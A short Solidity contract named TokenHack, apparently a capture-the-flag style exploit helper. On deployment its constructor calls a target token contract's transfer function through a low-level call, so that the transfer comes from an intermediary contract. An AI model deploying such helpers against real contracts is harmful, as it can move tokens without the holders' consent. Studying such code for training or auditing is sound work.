pragma solidity ^0.5.0;

contract TokenHack {
    // Deployed contract address
    address ca;

    constructor(address deployedAddress, address owner) public {
        ca = deployedAddress;
        callTransfer(owner, 1);
    }

    function callTransfer(address receiver, uint256 amount) public {
        bytes memory payload = abi.encodeWithSignature(
            "transfer(address,uint256)",
            receiver,
            amount
        );
        (bool success, ) = address(ca).call(payload);
        require(success);
    }

}
